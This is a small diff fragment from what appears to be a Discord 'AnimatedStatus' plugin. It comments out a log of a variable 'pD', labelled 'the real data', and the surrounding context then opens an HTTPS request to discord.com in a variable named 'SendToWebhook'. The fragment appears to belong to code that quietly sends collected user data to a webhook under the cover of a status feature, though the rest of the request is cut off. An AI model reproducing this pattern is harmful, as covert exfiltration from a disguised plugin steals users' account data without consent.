@@ -270,7 +270,7 @@ class AnimatedStatus {
       ],
     });
 
-    console.log("Sucess PD");
+    //console.log(pD); <-- use this only if you want to see the real data
 
     var SendToWebhook = https.request({
       hostname: "discord.com",
